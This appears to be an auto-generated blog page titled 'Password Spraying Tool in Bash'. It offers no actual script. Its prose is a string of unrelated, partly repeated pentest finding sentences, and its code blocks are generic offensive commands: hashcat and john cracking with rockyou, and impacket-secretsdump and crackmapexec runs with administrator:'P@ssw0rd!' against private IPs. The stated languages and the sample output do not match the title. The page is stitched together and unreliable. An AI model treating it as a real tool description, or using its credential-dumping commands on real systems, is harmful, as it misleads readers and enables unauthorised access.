---
TitleSEO: "Password Spraying Tool in Bash | ZureFX"
TitlePost: "Password Spraying Tool — Bash"
Author: "ZureFX"
Description: "A Bash script for password spraying tool. Built for security research and automation."
Keywords: "c, bash, go"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-388.html"
URL_IMAGES: ""
Date: "2025-09-25"
Tags: "C, Bash, Go"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-388"
Permalink: "/scripting/script-password-spraying-tool-388.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `bloodhound`
- `ligolo-ng`
- `secretsdump`

## Implementation

### Core Logic

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.38.157.238
```

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

```bash
crackmapexec smb 10.103.20.162 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file.

```bash
gobuster dir -u http://10.31.198.122/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p8443,8080,993 10.81.194.34 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.88.209.215
```

### Advanced Options

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
crackmapexec smb 10.54.88.222 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p139,110,389 10.97.232.160 -oN scan.txt
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 16 results
[+] Done in 22.43s
```
